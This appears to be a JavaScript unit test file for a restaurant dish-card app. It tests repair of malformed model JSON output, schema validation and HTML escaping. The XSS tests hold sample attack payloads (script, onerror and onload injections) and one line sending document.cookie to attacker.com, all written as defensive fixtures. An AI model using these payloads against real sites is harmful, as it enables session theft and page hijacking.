import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { JsonSanitizer } from '../src/parsers/json-sanitizer.js';
import { SchemaValidator } from '../src/parsers/schema-validator.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const fixturesDir = path.join(__dirname, 'fixtures');

describe('JsonSanitizer & SchemaValidator Unit Tests', () => {

  test('Scenario 1: Parses clean, valid standard JSON payload', () => {
    const rawContent = fs.readFileSync(path.join(fixturesDir, 'fixture-gemma-clean.json'), 'utf-8');
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, true);
    assert.ok(result.data, 'Data should not be null');
    assert.equal(result.data.originalName, 'Bebek Betutu');

    const validation = SchemaValidator.validateDishCard(result.data);
    assert.equal(validation.isValid, true, `Validation failed: ${validation.errors.join(', ')}`);
  });

  test('Scenario 2: Strips markdown code fences (```json ... ```)', () => {
    const rawContent = fs.readFileSync(path.join(fixturesDir, 'fixture-gemma-markdown-fences.txt'), 'utf-8');
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, true);
    assert.ok(result.fixedAnomalies.includes('STRIPPED_CODE_FENCE'), 'Should record STRIPPED_CODE_FENCE');
    assert.equal(result.data.originalName, 'Rawon Surabaya');

    const validation = SchemaValidator.validateDishCard(result.data);
    assert.equal(validation.isValid, true);
  });

  test('Scenario 3: Trims conversational preamble and trailing banter', () => {
    const rawContent = `Here is your requested dish analysis:\n{\n  "id": "dish-test-banter",\n  "originalName": "Soto Ayam",\n  "culturalNarrative": { "en": "Fragrant turmeric chicken soup." },\n  "flavorProfile": { "descriptors": ["Aromatic Turmeric", "Lemongrass"], "primaryTaste": "Savory", "spiceLevel": "Mild" },\n  "allergenFlags": [],\n  "dietaryTags": ["Halal-Friendly"],\n  "requiresKitchenVerification": false,\n  "status": "ENRICHED"\n}\nHope this helps your restaurant!`;
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, true);
    assert.ok(result.fixedAnomalies.includes('TRIMMED_CONVERSATIONAL_TEXT'), 'Should record TRIMMED_CONVERSATIONAL_TEXT');
    assert.equal(result.data.originalName, 'Soto Ayam');
  });

  test('Scenario 4: Fixes illegal trailing commas in objects and arrays', () => {
    const rawContent = fs.readFileSync(path.join(fixturesDir, 'fixture-gemma-trailing-commas.txt'), 'utf-8');
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, true);
    assert.ok(result.fixedAnomalies.includes('FIXED_TRAILING_COMMAS'), 'Should record FIXED_TRAILING_COMMAS');
    assert.equal(result.data.originalName, 'Gado-Gado Batavia');
    assert.equal(result.data.allergenFlags.length, 2);

    const validation = SchemaValidator.validateDishCard(result.data);
    assert.equal(validation.isValid, true);
  });

  test('Scenario 5: Recovers truncated JSON via closing bracket injection', () => {
    const rawContent = fs.readFileSync(path.join(fixturesDir, 'fixture-gemma-truncated.txt'), 'utf-8');
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, true);
    assert.ok(result.fixedAnomalies.includes('REPAIRED_UNCLOSED_BRACKETS'), 'Should record REPAIRED_UNCLOSED_BRACKETS');
    assert.equal(result.data.originalName, 'Kopi Tubruk Robusta');

    // Normalizing recovers missing fields like dietaryTags, requiresKitchenVerification
    const normalized = SchemaValidator.normalizeDishCard(result.data);
    const validation = SchemaValidator.validateDishCard(normalized);
    assert.equal(validation.isValid, true);
  });

  test('Scenario 6: Gracefully fails on extreme unrecoverable gibberish', () => {
    const rawContent = 'Internal Server Error: 500 Connection reset by peer.\nUnable to generate completion.';
    const result = JsonSanitizer.sanitize(rawContent);

    assert.equal(result.success, false);
    assert.equal(result.data, null);
    assert.ok(result.error, 'Should contain error explanation');

    // Isolated anomaly card generation
    const fallbackCard = SchemaValidator.createFallbackDishCard(
      { id: 'dish-failed-1', name: 'Es Cendol Durian' },
      rawContent,
      result.error
    );

    assert.equal(fallbackCard.status, 'FAILED_ANOMALY');
    assert.equal(fallbackCard.originalName, 'Es Cendol Durian');
    assert.equal(fallbackCard.requiresKitchenVerification, true);
    assert.equal(fallbackCard.rawResponseText, rawContent);

    const validation = SchemaValidator.validateDishCard(fallbackCard);
    assert.equal(validation.isValid, true, `Fallback card should be valid: ${validation.errors.join(', ')}`);
  });

  test('SchemaValidator: Validates completeness and catches schema violations', () => {
    const invalidObj = {
      id: 'dish-invalid',
      // missing originalName
      culturalNarrative: {}, // missing en
      flavorProfile: { spiceLevel: 'ExtremelyHot' }, // invalid level & missing descriptors
      allergenFlags: [{ allergen: 'InvalidAllergen', severity: 'MILD_WARNING', isImplicit: 'yes' }],
      dietaryTags: 'not-an-array',
      requiresKitchenVerification: 'maybe'
    };

    const validation = SchemaValidator.validateDishCard(invalidObj);
    assert.equal(validation.isValid, false);
    assert.ok(validation.errors.length >= 5, `Expected multiple errors, got: ${validation.errors.length}`);
  });

  test('SchemaValidator: Normalizes sparse and partial objects safely', () => {
    const partial = {
      dishName: 'Pisang Rai',
      culturalNarrative: 'Balinese steamed banana wrapped in rice flour dough and fresh coconut.',
      flavorProfile: {
        descriptors: ['Sweet Banana', 'Fragrant Pandan']
      }
    };

    const normalized = SchemaValidator.normalizeDishCard(partial, { id: 'dish-rai-1', regionalOrigin: 'Bali' });
    assert.equal(normalized.originalName, 'Pisang Rai');
    assert.equal(normalized.id, 'dish-rai-1');
    assert.equal(normalized.regionalOrigin, 'Bali');
    assert.equal(normalized.culturalNarrative.en, partial.culturalNarrative);
    assert.equal(normalized.flavorProfile.primaryTaste, 'Deep & Savory');
    assert.equal(normalized.requiresKitchenVerification, true, 'Should flag kitchen verification when rawIngredients is empty');

    const validation = SchemaValidator.validateDishCard(normalized);
    assert.equal(validation.isValid, true);
  });

  test('TASK-104: All 12 Golden Cache preset records strictly pass SchemaValidator', async () => {
    const { GOLDEN_CACHE } = await import('../src/data/golden-cache.js');
    const dishes = Object.values(GOLDEN_CACHE);
    assert.equal(dishes.length, 12, 'Expected 12 golden preset dishes across 3 presets');

    for (const dish of dishes) {
      const validation = SchemaValidator.validateDishCard(dish);
      assert.equal(
        validation.isValid,
        true,
        `Golden dish ${dish.id} (${dish.originalName}) failed validation: ${validation.errors.join(', ')}`
      );
      assert.ok(dish.culturalNarrative.en, 'Must have English narrative');
      assert.ok(dish.culturalNarrative.ja, 'Must have Japanese narrative');
      assert.ok(dish.culturalNarrative.zh, 'Must have Chinese narrative');
      assert.ok(dish.culturalNarrative.fr, 'Must have French narrative');
      assert.ok(dish.flavorProfile.descriptors.length >= 3, 'Must have at least 3 flavor descriptors');
    }
  });
});

describe('SEC-003 & TASK-104: XSS Defense & Output Sanitization Unit Tests', () => {

  test('escapeHtml properly encodes all HTML special characters', async () => {
    const { escapeHtml } = await import('../src/components/card-studio.js');

    assert.equal(escapeHtml('<script>alert("xss")</script>'), '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    assert.equal(escapeHtml('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
    assert.equal(escapeHtml("Tom's \"Special\" & 'Delight'"), 'Tom&#039;s &quot;Special&quot; &amp; &#039;Delight&#039;');
    assert.equal(escapeHtml(123), '');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
  });

  test('Queue progress event string interpolation neutralizes malicious dish names', async () => {
    const { escapeHtml } = await import('../src/components/card-studio.js');

    const maliciousDishNames = [
      '<script>alert("pwned")</script>',
      '<img src=x onerror=alert(1)>',
      '"><svg onload=alert(1)>',
      "Soto Ayam<b onmouseover='alert(1)'>!</b>"
    ];

    for (const rawName of maliciousDishNames) {
      const sanitizedName = escapeHtml(rawName);
      const queueProgressHtml = `<span>⏳</span> Queued: <strong>${sanitizedName}</strong> (1/5)`;

      assert.ok(!queueProgressHtml.includes('<script>'), `Must not contain unescaped <script>: ${queueProgressHtml}`);
      assert.ok(!queueProgressHtml.includes('<img'), `Must not contain unescaped <img: ${queueProgressHtml}`);
      assert.ok(!queueProgressHtml.includes('<svg'), `Must not contain unescaped <svg: ${queueProgressHtml}`);
      assert.ok(!queueProgressHtml.includes('<b onmouseover'), `Must not contain unescaped <b: ${queueProgressHtml}`);
      assert.ok(queueProgressHtml.includes('&lt;'), `Must contain escaped entity &lt;`);
    }
  });

  test('CardStudio renders escape malicious payloads across all dynamic fields', async () => {
    const { CardStudio } = await import('../src/components/card-studio.js');

    const maliciousDish = {
      id: 'dish-xss-attack',
      originalName: '<script>alert("xss-title")</script>',
      regionalOrigin: '<img src=x onerror=alert("xss-origin")>',
      priceText: '<b onclick=alert("price")>$15</b>',
      culturalNarrative: {
        en: '<svg onload=alert("xss-narrative")>Delicious heritage soup.</svg>'
      },
      flavorProfile: {
        descriptors: ['<script>evil()</script>', 'Fragrant Lemongrass'],
        primaryTaste: '<img src=x onerror=alert("taste")>',
        spiceLevel: 'Fiery'
      },
      allergenFlags: [
        {
          allergen: '<script>alert("allergen")</script>',
          severity: 'CRITICAL_WARNING',
          isImplicit: true,
          advisoryNote: '<img src=x onerror=alert("advisory")>',
          sourceIngredient: '<b>Secret Sambal</b>'
        }
      ],
      dietaryTags: ['<script>alert("tag")</script>'],
      rawIngredients: '<iframe src="javascript:alert(1)"></iframe>',
      tokensConsumed: {
        totalTokens: '<script>alert("tokens")</script>'
      },
      status: 'ENRICHED'
    };

    const originalDoc = globalThis.document;
    try {
      globalThis.document = {
        createElement(tagName) {
          return {
            tagName,
            className: '',
            attributes: {},
            setAttribute(k, v) { this.attributes[k] = v; },
            getAttribute(k) { return this.attributes[k]; },
            innerHTML: '',
            querySelector() { return null; },
            querySelectorAll() { return []; }
          };
        }
      };

      const card = CardStudio.createCardElement(maliciousDish, 'en');

      assert.ok(!card.innerHTML.includes('<script>'), 'card.innerHTML must not contain unescaped <script>');
      assert.ok(!card.innerHTML.includes('<img src=x'), 'card.innerHTML must not contain unescaped <img src=x');
      assert.ok(!card.innerHTML.includes('<svg onload='), 'card.innerHTML must not contain unescaped <svg onload=');
      assert.ok(!card.innerHTML.includes('<iframe'), 'card.innerHTML must not contain unescaped <iframe');
      assert.ok(!card.innerHTML.includes('<b onclick='), 'card.innerHTML must not contain unescaped <b onclick=');

      assert.ok(card.innerHTML.includes('&lt;script&gt;alert(&quot;xss-title&quot;)&lt;/script&gt;'));
      assert.ok(card.innerHTML.includes('&lt;img src=x onerror=alert(&quot;xss-origin&quot;)&gt;'));
      assert.ok(card.innerHTML.includes('&lt;script&gt;alert(&quot;tokens&quot;)&lt;/script&gt;'));
    } finally {
      globalThis.document = originalDoc;
    }
  });

  test('RemoteFallbackDrawer token display sanitizes malicious token input', async () => {
    const { escapeHtml } = await import('../src/components/card-studio.js');

    const maliciousToken = '<script>fetch("http://attacker.com/steal?token="+document.cookie)</script>';
    const masked = maliciousToken.length > 8
      ? `${maliciousToken.substring(0, 4)}...${maliciousToken.slice(-4)}`
      : 'Active';

    const safeHtml = `<span>🟢</span> Active (${escapeHtml(masked)})`;

    assert.ok(!safeHtml.includes('<script>'), 'Must not contain raw script tag');
    assert.ok(safeHtml.includes('&lt;scr...ipt&gt;'), 'Must contain escaped token boundaries');
  });
});

